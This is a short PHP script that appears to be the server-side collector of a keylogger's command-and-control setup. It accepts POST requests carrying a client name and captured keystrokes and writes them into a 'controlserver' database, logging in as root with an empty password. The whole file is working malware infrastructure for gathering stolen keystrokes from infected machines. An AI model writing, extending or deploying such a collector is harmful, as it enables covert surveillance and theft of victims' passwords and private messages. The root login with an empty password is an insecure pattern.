<?php

if(isset($_POST['client']) && !empty($_POST['client'])){
	$client = $_POST['client'];
	$keylog = $_POST['keylog'];
	
	$db = new mysqli('localhost', 'root','', 'controlserver');
	if(mysqli_connect_errno()) exit;
	
		
	
	$query = "UPDATE clients SET keylog=? WHERE name=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('ss', $keylog, $client); 
	$stmt->execute();
	
	$db->close();	
}
?>